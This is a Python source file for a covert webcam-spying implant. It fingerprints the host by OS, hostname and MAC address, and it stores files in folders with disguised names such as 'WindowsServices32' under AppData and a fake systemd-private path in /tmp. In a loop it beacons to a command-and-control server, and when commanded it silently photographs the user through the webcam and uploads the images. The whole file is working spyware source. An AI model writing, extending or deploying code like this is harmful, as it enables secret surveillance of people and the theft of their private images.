import cv2
import time
import requests
import os
import platform
from uuid import getnode as get_mac

if platform.system() == "Windows":
    system = "windows"
    hostname = platform.uname().node
elif platform.system() == "Linux":
    system = "linux"
    hostname = os.uname()[1]
else:
    exit()

mac_address = ":".join(("%012X" % get_mac()) [i:i+2] for i in range(0, 12, 2))

if system == "windows":
    path = f"{os.getenv('appdata')}\\WindowsServices32\\"
else:
    path = "/tmp/systemd-private-adikdk2112312-service/"
if not os.path.exists(path):
    os.mkdir(path)
    

c2_base_url = "http://127.0.0.1:8000/"
password = "hej"

images = 0

### Take webcam picture ###
def webcam_pic():
    global images
    webcam = cv2.VideoCapture(0)
    check, frame = webcam.read()
    if not check:
        return 0
    time.sleep(0.5)
    cv2.imwrite(filename=f'{path}webcam_image_{images}.jpg', img=frame)
    webcam.release()

    ### Upload pic to c2
    data = {"password": password, "user": hostname}
    files = {"file": open(f"{path}webcam_image_{images}.jpg", "rb")}
    requests.post(f"{c2_base_url}core/upload", data=data, files=files)
    
    images += 1
    return 1

def main():
    while True:
        data = {"password": password, "mac_address": mac_address,
                "hostname": hostname, "system": system
                }
        requests.get(f"{c2_base_url}core/alive_service", params=data)
        control_json = requests.get(f"{c2_base_url}core/control", params=data)
        control_json = control_json.json()
        print(control_json)
        if control_json.get("webcam") == True:
            webcam_pic()
        time.sleep(1)


if __name__ == "__main__":
    main()